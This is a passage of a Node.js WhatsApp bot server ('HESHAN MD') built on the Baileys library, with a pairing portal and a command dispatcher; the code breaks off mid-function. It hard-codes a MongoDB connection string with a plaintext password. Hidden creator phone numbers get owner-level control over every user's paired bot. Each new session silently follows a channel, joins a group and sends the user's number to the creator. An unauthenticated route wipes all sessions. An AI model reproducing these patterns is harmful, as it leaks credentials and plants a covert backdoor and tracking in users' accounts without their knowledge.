// ============================================================================
// 📦 PACKAGES
// ============================================================================
const express = require('express');
const pino = require('pino');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
const NodeCache = require('node-cache');
const fetch = require('node-fetch');
const {
  default: makeWASocket,
  DisconnectReason,
  delay,
  Browsers,
  makeCacheableSignalKeyStore,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

// 🟢 Global Process Crash Guards
process.on('uncaughtException', (err) => {
  console.error('🛡️ Uncaught Exception Guard:', err?.message || err);
});
process.on('unhandledRejection', (err) => {
  console.error('🛡️ Unhandled Rejection Guard:', err?.message || err);
});

// 🟢 Config & DB Models
let configUri = '';
let BOT_NAME = 'HESHAN MD V1';
try {
  const config = require('./config');
  configUri = config.MONGODB_URI;
  if (config.BOT_NAME) BOT_NAME = config.BOT_NAME;
} catch (e) {}

const MONGODB_URI = process.env.MONGODB_URI || configUri || 'mongodb+srv://diniduheshan40_db_user:Heshan2007@cluster0.5gazebm.mongodb.net/?appName=Cluster0';
const { useMongoDBAuthState, Auth } = require('./auth');

// ============================================================================
// 🌍 GLOBAL CONSTANTS
// ============================================================================

const UPDATE_CHANNEL_JID = '120363421906774107@newsletter';
const CHANNEL_REACTIONS = ['🥰', '👍', '❤️', '😗', '😯', '🪄', '✨'];
const DEFAULT_BACKUP_LOGO = 'https://files.catbox.moe/a58add.jpeg';

const REAL_OWNER_NUMBER = '94719845166';
const OWNER_NUMBERS = [
  '94719845166',
  '94720882316',
  '15947733680169',
  '15947733680169@lid',
  '72787431583987',
  '72787431583987@lid'
];

const DEFAULT_SETTINGS = {
  workMode: 'public',
  autoStatusSeen: true,
  statusReact: true,
  statusReactEmoji: '💐',
  botLogo: DEFAULT_BACKUP_LOGO,
  autoPresence: 'off',
  securityPin: '1234',
  isFirstConnectDone: false
};

// ============================================================================
// 🧠 RUNTIME STATE
// ============================================================================

const settingsCache = new NodeCache({ stdTTL: 300, checkperiod: 60, maxKeys: 200 });
const activeSessions = {};
global.activeSessions = activeSessions;
const isStarting = {};
const reconnectAttempts = {};
const commands = new Map();

// ============================================================================
// 🗄️ DATABASE SCHEMA & HELPERS
// ============================================================================

function createSettingsModel() {
  const SettingsSchema = new mongoose.Schema({
    _id: { type: String, required: true },
    workMode: { type: String, default: DEFAULT_SETTINGS.workMode },
    autoStatusSeen: { type: Boolean, default: DEFAULT_SETTINGS.autoStatusSeen },
    statusReact: { type: Boolean, default: DEFAULT_SETTINGS.statusReact },
    statusReactEmoji: { type: String, default: DEFAULT_SETTINGS.statusReactEmoji },
    botLogo: { type: String, default: DEFAULT_SETTINGS.botLogo },
    autoPresence: { type: String, default: DEFAULT_SETTINGS.autoPresence },
    securityPin: { type: String, default: DEFAULT_SETTINGS.securityPin },
    isFirstConnectDone: { type: Boolean, default: DEFAULT_SETTINGS.isFirstConnectDone }
  });

  return mongoose.models.BotSettings || mongoose.model('BotSettings', SettingsSchema);
}

const SettingsModel = createSettingsModel();

function clearSettingsCache(num) {
  settingsCache.del(num);
}
global.clearSettingsCache = clearSettingsCache;

async function getBotSettings(botNum) {
  if (!botNum) return { ...DEFAULT_SETTINGS };
  const cached = settingsCache.get(botNum);
  if (cached) return cached;

  try {
    let settings = await SettingsModel.findById(botNum).lean();
    if (!settings) {
      const created = await SettingsModel.create({ _id: botNum, ...DEFAULT_SETTINGS });
      settings = created.toObject();
    }
    settingsCache.set(botNum, settings);
    return settings;
  } catch (e) {
    return { ...DEFAULT_SETTINGS };
  }
}

// ============================================================================
// 📂 COMMAND LOADER
// ============================================================================

function registerCommandAliases(cmd, cmdName) {
  if (cmd && cmd.name) commands.set(cmd.name.toLowerCase(), cmd);
  commands.set(cmdName, cmd);

  if (cmd && cmd.alias) {
    if (Array.isArray(cmd.alias)) {
      for (const al of cmd.alias) commands.set(al.toLowerCase(), cmd);
    } else if (typeof cmd.alias === 'string') {
      commands.set(cmd.alias.toLowerCase(), cmd);
    }
  }
}

function loadCommandFile(cmdDir, file) {
  try {
    let cmd = require(path.join(cmdDir, file));
    if (cmd.default) cmd = cmd.default;
    const cmdName = file.replace('.js', '').toLowerCase();
    registerCommandAliases(cmd, cmdName);
  } catch (e) {
    console.error(`❌ Error loading ${file}:`, e.message);
  }
}

function loadAllCommands() {
  const cmdDir = path.join(__dirname, 'commands');
  if (!fs.existsSync(cmdDir)) return;
  const cmdFiles = fs.readdirSync(cmdDir).filter(f => f.endsWith('.js'));
  for (const file of cmdFiles) {
    loadCommandFile(cmdDir, file);
  }
}

function findCommand(...names) {
  for (const name of names) {
    const cmd = commands.get(name);
    if (cmd) return cmd;
  }
  return null;
}

function getCommandExecutor(cmd) {
  if (typeof cmd === 'function') return cmd;
  if (cmd && typeof cmd.execute === 'function') return cmd.execute;
  if (cmd && typeof cmd.run === 'function') return cmd.run;
  if (cmd && typeof cmd.downloadAndSendStatus === 'function') return cmd.downloadAndSendStatus;
  return null;
}

// ============================================================================
// 🌐 LUXURY RED-BLACK GLASSMORPHIC PORTAL
// ============================================================================

function renderPortalHtml(botName) {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${botName} • PAIRING STATION</title>
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@700;800&display=swap" rel="stylesheet">
      <style>
        :root {
          --bg-core: #090305;
          --panel-bg: rgba(20, 6, 10, 0.72);
          --accent-red: #e11d48;
          --accent-glow: rgba(225, 29, 72, 0.35);
          --crimson-soft: #fb7185;
          --border-glass: rgba(244, 63, 94, 0.22);
          --border-focus: rgba(244, 63, 94, 0.65);
          --text-main: #fcfcfd;
          --text-muted: #9f8e93;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
          background-color: var(--bg-core);
          background-image: 
            radial-gradient(circle at 50% 0%, rgba(225, 29, 72, 0.18) 0%, transparent 60%),
            radial-gradient(circle at 10% 90%, rgba(159, 18, 57, 0.12) 0%, transparent 45%);
          color: var(--text-main);
          font-family: 'Outfit', sans-serif;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
          padding: 24px;
        }

        .portal-card {
          background: var(--panel-bg);
          backdrop-filter: blur(28px) saturate(160%);
          -webkit-backdrop-filter: blur(28px) saturate(160%);
          border: 1px solid var(--border-glass);
          border-radius: 28px;
          padding: 44px 34px;
          width: 100%;
          max-width: 440px;
          text-align: center;
          box-shadow: 
            0 24px 60px rgba(0, 0, 0, 0.65),
            0 0 45px var(--accent-glow);
          position: relative;
          overflow: hidden;
        }

        .portal-card::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          height: 3px;
          background: linear-gradient(90deg, transparent, var(--accent-red), transparent);
        }

        .badge-status {
          display: inline-flex;
          align-items: center;
          gap: 7px;
          font-size: 11px;
          font-weight: 700;
          letter-spacing: 1.5px;
          text-transform: uppercase;
          color: var(--crimson-soft);
          background: rgba(225, 29, 72, 0.12);
          border: 1px solid rgba(225, 29, 72, 0.28);
          padding: 5px 14px;
          border-radius: 30px;
          margin-bottom: 20px;
        }

        .badge-dot {
          width: 6px;
          height: 6px;
          background: var(--accent-red);
          border-radius: 50%;
          box-shadow: 0 0 8px var(--accent-red);
        }

        .app-title {
          font-size: 30px;
          font-weight: 800;
          letter-spacing: -0.5px;
          background: linear-gradient(135deg, #ffffff 40%, var(--crimson-soft) 80%, var(--accent-red) 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          margin-bottom: 6px;
        }

        .app-desc {
          font-size: 13.5px;
          color: var(--text-muted);
          margin-bottom: 30px;
          font-weight: 400;
        }

        .input-wrap {
          position: relative;
          margin-bottom: 16px;
        }

        .phone-input {
          width: 100%;
          padding: 16px 20px;
          border-radius: 16px;
          border: 1px solid var(--border-glass);
          background: rgba(12, 3, 6, 0.7);
          color: var(--text-main);
          font-size: 17px;
          font-weight: 600;
          letter-spacing: 0.8px;
          text-align: center;
          outline: none;
          transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .phone-input::placeholder {
          color: rgba(255, 255, 255, 0.25);
          font-weight: 400;
          letter-spacing: 0;
        }

        .phone-input:focus {
          border-color: var(--border-focus);
          box-shadow: 0 0 24px rgba(225, 29, 72, 0.35);
          background: rgba(18, 4, 9, 0.9);
        }

        .btn-action {
          width: 100%;
          padding: 16px;
          border-radius: 16px;
          border: none;
          background: linear-gradient(135deg, #be123c 0%, var(--accent-red) 100%);
          color: #ffffff;
          font-size: 14.5px;
          font-weight: 700;
          letter-spacing: 0.5px;
          cursor: pointer;
          transition: all 0.25s ease;
          box-shadow: 0 8px 24px rgba(225, 29, 72, 0.3);
          margin-bottom: 12px;
        }

        .btn-action:hover {
          transform: translateY(-2px);
          box-shadow: 0 12px 30px rgba(225, 29, 72, 0.45);
        }

        .btn-action:active {
          transform: translateY(0);
        }

        .btn-reset {
          width: 100%;
          padding: 13px;
          border-radius: 14px;
          border: 1px solid rgba(225, 29, 72, 0.25);
          background: rgba(225, 29, 72, 0.08);
          color: var(--crimson-soft);
          font-size: 12.5px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.25s ease;
        }

        .btn-reset:hover {
          background: rgba(225, 29, 72, 0.18);
          border-color: rgba(225, 29, 72, 0.45);
        }

        .code-container {
          display: none;
          margin-top: 24px;
          animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }

        .code-box {
          font-family: 'JetBrains Mono', monospace;
          font-size: 32px;
          font-weight: 800;
          letter-spacing: 5px;
          color: #ffe4e6;
          background: rgba(225, 29, 72, 0.14);
          border: 1.5px dashed rgba(251, 113, 133, 0.45);
          padding: 18px;
          border-radius: 16px;
          cursor: pointer;
          transition: all 0.25s ease;
        }

        .code-box:hover {
          background: rgba(225, 29, 72, 0.22);
          border-color: var(--crimson-soft);
          transform: scale(1.02);
        }

        .copy-tag {
          font-size: 11.5px;
          color: var(--text-muted);
          margin-top: 8px;
          font-weight: 500;
        }

        .footer-note {
          margin-top: 28px;
          font-size: 11px;
          letter-spacing: 1px;
          color: rgba(255, 255, 255, 0.25);
          text-transform: uppercase;
        }
      </style>
    </head>
    <body>
      <div class="portal-card">
        <div class="badge-status">
          <span class="badge-dot"></span> Online System
        </div>
        <h1 class="app-title">${botName}</h1>
        <p class="app-desc">Enter phone number with country code</p>

        <div class="input-wrap">
          <input type="text" id="phone" class="phone-input" placeholder="e.g. 9470xxxxxxx" />
        </div>

        <button id="btn" class="btn-action" onclick="fetchPairCode()">GET PAIRING CODE</button>
        <button class="btn-reset" onclick="cleanSessionSlot()">CLEAN THIS SESSION</button>

        <div class="code-container" id="codeWrapper">
          <div class="code-box" id="codeDisplay" onclick="copyCode()"></div>
          <div class="copy-tag">Click code to copy to clipboard</div>
        </div>

        <p class="footer-note">Powered by Heshan MD</p>
      </div>

      <script>
        async function fetchPairCode() {
          const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
          if (!phone || phone.length < 10) return alert('කරුණාකර නිවැරදි Country Code සහිත අංකය ඇතුළත් කරන්න!');

          const btn = document.getElementById('btn');
          const wrapper = document.getElementById('codeWrapper');
          const display = document.getElementById('codeDisplay');

          btn.innerText = 'GENERATING CODE...';
          btn.disabled = true;
          wrapper.style.display = 'none';

          try {
            const res = await fetch('/pair?num=' + phone);
            const data = await res.json();
            if (data.code) {
              display.innerText = data.code;
              wrapper.style.display = 'block';
              navigator.clipboard.writeText(data.code).catch(()=>{});
              alert('✅ Pairing Code: ' + data.code);
            } else {
              alert(data.error || 'Connection rate-limited. Please wait 15 seconds.');
            }
          } catch(e) {
            alert('Server connection error. Refresh page and retry!');
          }
          btn.innerText = 'GET PAIRING CODE';
          btn.disabled = false;
        }

        async function cleanSessionSlot() {
          const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
          if (!phone) return alert('Clean කිරීමට Phone Number එක ඇතුළත් කරන්න!');
          if (confirm('+' + phone + ' සඳහා පැරණි session එක සම්පූර්ණයෙන්ම Clean කරන්නද?')) {
            try {
              const res = await fetch('/reset-num?num=' + phone);
              const data = await res.json();
              if (data.success) {
                alert('✅ Session Cleared! දැන් Pair Code එක Generate කරන්න.');
              }
            } catch(e) {
              alert('Clean request failed!');
            }
          }
        }

        function copyCode() {
          const code = document.getElementById('codeDisplay').innerText;
          if (code) {
            navigator.clipboard.writeText(code);
            alert('✅ Copied to clipboard: ' + code);
          }
        }
      </script>
    </body>
    </html>
  `;
}

function registerPortalRoute(app) {
  app.get('/', (req, res) => {
    res.send(renderPortalHtml(BOT_NAME));
  });
}

// ============================================================================
// 🔌 SOCKET CREATION
// ============================================================================

async function createBaileysSocket(phoneNumber) {
  const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(phoneNumber);
  const logger = pino({ level: 'silent' });
  const msgRetryCounterCache = new NodeCache({ stdTTL: 180, checkperiod: 60, maxKeys: 300 });
  const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1015901307] }));

  const sock = makeWASocket({
    version,
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
    logger,
    printQRInTerminal: false,
    browser: Browsers.macOS('Safari'),
    msgRetryCounterCache,
    syncFullHistory: false,
    generateHighQualityLinkPreview: false,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 30000,
    keepAliveIntervalMs: 25000,
    markOnlineOnConnect: false,
    emitOwnEvents: false,
    shouldIgnoreJid: () => false
  });

  sock.ev.on('creds.update', saveCreds);
  return { sock, clearSessionData };
}

// ============================================================================
// 🔄 CONNECTION LIFECYCLE (OPTIMIZED 440 & CRASH PROTECTED)
// ============================================================================

async function handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSessionData) {
  const statusCode = lastDisconnect?.error?.output?.statusCode;
  console.log(`⚠️ Connection closed (${phoneNumber}), Code: ${statusCode}`);

  try {
    sock.ev.removeAllListeners();
    sock.ws?.close();
  } catch (e) {}

  delete activeSessions[phoneNumber];

  if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
    console.log(`❌ Permanent session logout: ${phoneNumber}`);
    delete reconnectAttempts[phoneNumber];
    if (typeof clearSessionData === 'function') await clearSessionData();
    return;
  }

  // 🛡️ Code 440 (Conflict / Replaced Session) & Exponential Cooldown
  reconnectAttempts[phoneNumber] = (reconnectAttempts[phoneNumber] || 0) + 1;
  let delayTime = 6000;

  if (statusCode === 440) {
    delayTime = Math.min(reconnectAttempts[phoneNumber] * 12000, 45000);
    console.log(`⏳ [${phoneNumber}] Session Conflict (440). Waiting ${Math.round(delayTime / 1000)}s before retry...`);
  } else if (reconnectAttempts[phoneNumber] > 5) {
    delayTime = 25000;
  }

  setTimeout(() => {
    initWhatsApp(phoneNumber);
  }, delayTime);
}

async function autoFollowChannelAndJoinGroup(sock, phoneNumber) {
  await delay(2500);
  try {
    const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
    if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
      const channelMeta = await sock.newsletterMetadata('invite', inviteCode);
      if (channelMeta?.id) await sock.newsletterFollow(channelMeta.id);
    }
  } catch (e) {}

  try {
    const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X';
    if (typeof sock.groupAcceptInvite === 'function') {
      await sock.groupAcceptInvite(groupInviteCode);
    }
  } catch (e) {}
}

function buildConnectedMessage(botNum) {
  return `*✦ ${BOT_NAME} CONNECTED ✦*
━━━━━━━━━━━━━━━━━━━━━
• *Number*    : +${botNum}
• *Engine*    : HESHAN-MD V2
• *Features*  : Auto Status | Anti-Delete
• *State*     : Online (24/7 Cloud)
━━━━━━━━━━━━━━━━━━━━━
> Type *.menu* to explore all commands.`.trim();
}

async function sendFirstConnectAlerts(sock, phoneNumber) {
  try {
    const botNum = sock.user?.id
      ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '')
      : phoneNumber.replace(/[^0-9]/g, '');

    const botJid = `${botNum}@s.whatsapp.net`;
    const creatorJid = `${REAL_OWNER_NUMBER}@s.whatsapp.net`;

    const currentSettings = await getBotSettings(botNum);
    if (currentSettings.isFirstConnectDone) return;

    const sessionLogo = currentSettings.botLogo || DEFAULT_BACKUP_LOGO;
    const connectedMsg = buildConnectedMessage(botNum);

    await sock.sendMessage(botJid, { image: { url: sessionLogo }, caption: connectedMsg }).catch(() => {
      sock.sendMessage(botJid, { text: connectedMsg }).catch(() => {});
    });

    if (!botNum.includes(REAL_OWNER_NUMBER)) {
      const alertMsg = `*🔔 ALERT : NEW SESSION CONNECTED*
━━━━━━━━━━━━━━━━━━━━━
• *Number* : +${botNum}
• *System* : Initialized successfully
━━━━━━━━━━━━━━━━━━━━━`;
      await sock.sendMessage(creatorJid, { text: alertMsg }).catch(() => {});
    }

    await SettingsModel.findByIdAndUpdate(botNum, { isFirstConnectDone: true }, { upsert: true });
    clearSettingsCache(botNum);
  } catch (e) {}
}

function handleConnectionOpen(sock, phoneNumber) {
  console.log(`✅ BOT CONNECTED: ${phoneNumber}`);
  reconnectAttempts[phoneNumber] = 0;
  autoFollowChannelAndJoinGroup(sock, phoneNumber);
  setTimeout(() => sendFirstConnectAlerts(sock, phoneNumber), 3000);
}

function registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData) {
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      await handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSessionData);
    } else if (connection === 'open') {
      handleConnectionOpen(sock, phoneNumber);
    }
  });
}

// ============================================================================
// 💬 MESSAGE HANDLING HELPERS
// ============================================================================

async function reactToChannelPost(sock, msg, chatJid) {
  try {
    const randomEmoji = CHANNEL_REACTIONS[Math.floor(Math.random() * CHANNEL_REACTIONS.length)];
    await delay(Math.floor(Math.random() * 3000) + 1200);

    const serverId = msg.message?.newsletterAdminInviteMessage?.newsletterJid || msg.key?.server_id || msg.key?.id;
    if (typeof sock.newsletterReactMessage === 'function' && serverId) {
      await sock.newsletterReactMessage(chatJid, serverId, randomEmoji);
    } else {
      await sock.sendMessage(chatJid, { react: { text: randomEmoji, key: msg.key } });
    }
  } catch (err) {}
}

async function simulateAutoPresence(sock, chatJid, settings) {
  if (!settings.autoPresence || settings.autoPresence === 'off') return;
  try {
    const type = settings.autoPresence === 'recording' ? 'recording' : 'composing';
    await sock.sendPresenceUpdate(type, chatJid);
  } catch (err) {}
}

async function handleStatusBroadcast(sock, msg, settings) {
  if (!settings.autoStatusSeen) return;
  try {
    await sock.readMessages([msg.key]);
    if (settings.statusReact && msg.key.participant) {
      await sock.sendMessage(
        'status@broadcast',
        { react: { text: settings.statusReactEmoji || '💐', key: msg.key } },
        { statusJidList: [msg.key.participant] }
      );
    }
  } catch (e) {}
}

function resolveOriginalSender(msg, chatJid, isGroup, myBotJid) {
  if (msg.key.fromMe) return myBotJid;
  if (isGroup) return msg.key.participant || msg.participant || chatJid;
  return chatJid;
}

async function resolveLidToRealJid(sock, originalSender) {
  if (!originalSender || !originalSender.endsWith('@lid') || !sock.signalRepository?.lidToJid) {
    return originalSender;
  }
  try {
    const resolved = await sock.signalRepository.lidToJid(originalSender);
    return resolved || originalSender;
  } catch (e) {
    return originalSender;
  }
}

function isOwnerJid(jid) {
  if (!jid) return false;
  const str = String(jid);
  return OWNER_NUMBERS.some(owner => str.includes(owner));
}

function checkIsOwner(originalSender, resolvedSender) {
  return isOwnerJid(originalSender) || isOwnerJid(resolvedSender);
}

function checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum) {
  return isOwner || msg.key.fromMe || (myBotNum && cleanSenderNum === myBotNum);
}

function shouldSkipDueToWorkMode(isAuthorized, isGroup, workMode) {
  if (isAuthorized) return false;
  const mode = String(workMode || 'public').toLowerCase().trim();
  if (mode === 'public') return false;
  if (mode === 'private' || mode === 'self') return true;
  if ((mode === 'groups' || mode === 'group') && !isGroup) return true;
  if (mode === 'inbox' && isGroup) return true;
  return false;
}

function unwrapMessageContent(message) {
  return (
    message?.ephemeralMessage?.message ||
    message?.viewOnceMessage?.message ||
    message?.viewOnceMessageV2?.message ||
    message?.documentWithCaptionMessage?.message ||
    message
  );
}

function extractMessageText(rawMsg) {
  return (
    rawMsg?.conversation ||
    rawMsg?.extendedTextMessage?.text ||
    rawMsg?.imageMessage?.caption ||
    rawMsg?.videoMessage?.caption ||
    rawMsg?.buttonsResponseMessage?.selectedButtonId ||
    rawMsg?.templateButtonReplyMessage?.selectedId ||
    ''
  ).trim();
}

function buildSafeReply(sock, chatJid, msg) {
  return async (content) => {
    const replyPayload = typeof content === 'string' ? { text: content } : content;
    try {
      return await sock.sendMessage(chatJid, replyPayload, { quoted: msg });
    } catch (e) {
      return await sock.sendMessage(chatJid, replyPayload);
    }
  };
}

function isSettingsMenuOption(cleanInput) {
  return (
    /^([1-7](\.[1-4])?)$/.test(cleanInput) ||
    cleanInput.startsWith('6 ') ||
    cleanInput.startsWith('pin ') ||
    cleanInput.startsWith('set ')
  );
}

function extractQuotedCaption(quotedMsgObj) {
  return (
    quotedMsgObj?.imageMessage?.caption ||
    quotedMsgObj?.videoMessage?.caption ||
    quotedMsgObj?.conversation ||
    quotedMsgObj?.extendedTextMessage?.text ||
    ''
  );
}

function isQuotedFromSettingsMenu(quotedCaption) {
  return (
    quotedCaption.includes('SYSTEM SETTINGS') ||
    quotedCaption.includes('HESHAN-MD') ||
    quotedCaption.includes('WORK MODE') ||
    quotedCaption.includes('FAKE ACTION')
  );
}

async function handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum) {
  const settingsCmd = findCommand('settings', 'setting', 'set');
  if (!settingsCmd) return false;
  const cmdFunc = getCommandExecutor(settingsCmd);
  if (!cmdFunc) return false;

  clearSettingsCache(myBotNum);
  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
  return true;
}

async function handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized) {
  const statusCmd = findCommand('save', 'status');
  if (!statusCmd) return false;
  const cmdFunc = getCommandExecutor(statusCmd);
  if (!cmdFunc) return false;

  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
  return true;
}

async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode) {
  const prefixMatch = text.match(/^[./!#]/);
  if (!prefixMatch) return false;

  const prefix = prefixMatch[0];
  const args = text.slice(prefix.length).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();

  const isSettingsCmd = ['setting', 'settings', 'set', 'config'].includes(commandName);
  if (isSettingsCmd && isGroup) return true;
  if (isSettingsCmd && !isAuthorized) return true;

  if (shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
    return true;
  }

  let targetCmd = commands.get(commandName);
  if (!targetCmd && isSettingsCmd) targetCmd = findCommand('settings', 'setting', 'set');
  if (!targetCmd) return false;

  try {
    const cmdFunc = getCommandExecutor(targetCmd);
    if (cmdFunc) {
      await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorized });
    }
  } catch (err) {
    console.error(`Command [${commandName}] execution error:`, err?.message);
  }
  return true;
}

// ============================================================================
// 💬 SINGLE MESSAGE PROCESSOR
// ============================================================================

async function processSingleMessage(sock, msg, phoneNumber) {
  if (!msg || !msg.message) return;
  const chatJid = msg.key?.remoteJid;
  if (!chatJid) return;

  if (chatJid === UPDATE_CHANNEL_JID || chatJid.endsWith('@newsletter')) {
    if (!msg.message.reactionMessage) reactToChannelPost(sock, msg, chatJid);
    return;
  }

  if (msg.message.reactionMessage) return;

  const isGroup = chatJid.endsWith('@g.us');
  const myBotJid = sock.user?.id || '';
  const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || phoneNumber.replace(/[^0-9]/g, '');
  const settings = await getBotSettings(myBotNum);

  if (!msg.key.fromMe) simulateAutoPresence(sock, chatJid, settings);

  if (chatJid === 'status@broadcast') {
    await handleStatusBroadcast(sock, msg, settings);
    return;
  }

  const originalSender = resolveOriginalSender(msg, chatJid, isGroup, myBotJid);
  const resolvedSender = await resolveLidToRealJid(sock, originalSender);
  const isOwner = checkIsOwner(originalSender, resolvedSender);

  const cleanSenderNum = resolvedSender.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
  const isAuthorized = checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum);
  const currentMode = settings.workMode || 'public';

  if (shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) return;

  const rawMsg = unwrapMessageContent(msg.message);
  const text = extractMessageText(rawMsg);
  if (!text) return;

  const quotedContext = msg.message?.extendedTextMessage?.contextInfo;
  const quotedMsgObj = quotedContext?.quotedMessage;
  const safeReply = buildSafeReply(sock, chatJid, msg);
  const cleanInput = text.toLowerCase().trim();

  const settingsOption = isSettingsMenuOption(cleanInput);
  const quotedCaption = extractQuotedCaption(quotedMsgObj);
  const fromSettingsMenu = isQuotedFromSettingsMenu(quotedCaption);

  if (settingsOption && !isGroup && isAuthorized && (fromSettingsMenu || quotedMsgObj)) {
    const handled = await handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum);
    if (handled) return;
  }

  const statusKeywords = ['oni', 'ඕනි', 'ඕනෙ', 'dapan', 'දාපන්', 'ewanna', 'එවන්න', 'save', 'status', 'send'];
  const isQuotedFromStatus = quotedContext?.remoteJid === 'status@broadcast' || quotedContext?.participant?.includes('@broadcast');

  if (quotedMsgObj && (isQuotedFromStatus || statusKeywords.includes(cleanInput))) {
    if (statusKeywords.includes(cleanInput)) {
      const handled = await handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized);
      if (handled) return;
    }
  }

  await handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode);
}

function registerMessageUpsertHandler(sock, phoneNumber) {
  sock.ev.on('messages.upsert', ({ messages, type }) => {
    if (!messages || !messages.length) return;
    for (const msg of messages) {
      const jid = msg.key?.remoteJid || '';
      if (type !== 'notify' && !jid.endsWith('@newsletter') && jid !== UPDATE_CHANNEL_JID && !msg.key?.fromMe) {
        continue;
      }
      processSingleMessage(sock, msg, phoneNumber).catch(() => {});
    }
  });
}

// ============================================================================
// 🚀 MAIN WHATSAPP INITIALIZER
// ============================================================================

async function initWhatsApp(phoneNumber) {
  if (activeSessions[phoneNumber]) return activeSessions[phoneNumber];
  if (isStarting[phoneNumber]) return;
  isStarting[phoneNumber] = true;

  try {
    const { sock, clearSessionData } = await createBaileysSocket(phoneNumber);
    activeSessions[phoneNumber] = sock;
    delete isStarting[phoneNumber];

    registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData);
    registerMessageUpsertHandler(sock, phoneNumber);

    return sock;
  } catch (err) {
    delete isStarting[phoneNumber];
    console.error(`initWhatsApp Error (${phoneNumber}):`, err.message);
  }
}

// ============================================================================
// 🌐 HTTP ROUTES & ULTRA-STABLE PAIRING ENGINE
// ============================================================================

function stopAndRemoveSession(num) {
  if (!activeSessions[num]) return;
  try {
    activeSessions[num].ev.removeAllListeners();
    activeSessions[num].ws?.close();
  } catch (e) {}
  delete activeSessions[num];
}

function registerResetAllRoute(app) {
  app.get('/reset', async (req, res) => {
    try {
      await Auth.deleteMany({});
      if (mongoose.connection.db) {
        await mongoose.connection.db.collection('auths').deleteMany({});
      }
      Object.keys(activeSessions).forEach(num => {
        try {
          activeSessions[num].ev.removeAllListeners();
          activeSessions[num].ws?.close();
        } catch (e) {}
        delete activeSessions[num];
      });
      settingsCache.flushAll();
      res.json({ success: true, message: 'All sessions successfully wiped!' });
    } catch (err) {
      res.status(500).json({ success: false, error: err.message });
    }
  });
}

function registerResetSingleNumberRoute(app) {
  app.get('/reset-num', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number required' });
    num = num.replace(/[^0-9]/g, '');

    try {
      stopAndRemoveSession(num);
      await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
      return res.json({ success: true, message: `Session cleared for ${num}` });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  });
}

function registerPairRoute(app) {
  app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number required' });
    num = num.replace(/[^0-9]/g, '');

    stopAndRemoveSession(num);
    await Auth.deleteMany({ _id: new RegExp('^' + num, 'i') });
    await SettingsModel.findByIdAndUpdate(num, { $set: { isFirstConnectDone: false } }, { upsert: true }).catch(() => {});
    clearSettingsCache(num);

    let pairSock = null;

    try {
      const { state, saveCreds } = await useMongoDBAuthState(num);
      const logger = pino({ level: 'silent' });
      const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1015901307] }));

      pairSock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
        logger,
        printQRInTerminal: false,
        browser: Browsers.macOS('Safari'),
        connectTimeoutMs: 30000,
        defaultQueryTimeoutMs: 25000,
        keepAliveIntervalMs: 25000,
        emitOwnEvents: false
      });

      pairSock.ev.on('creds.update', saveCreds);

      pairSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
          activeSessions[num] = pairSock;
          registerConnectionUpdateHandler(pairSock, num);
          registerMessageUpsertHandler(pairSock, num);
          handleConnectionOpen(pairSock, num);
        } else if (connection === 'close') {
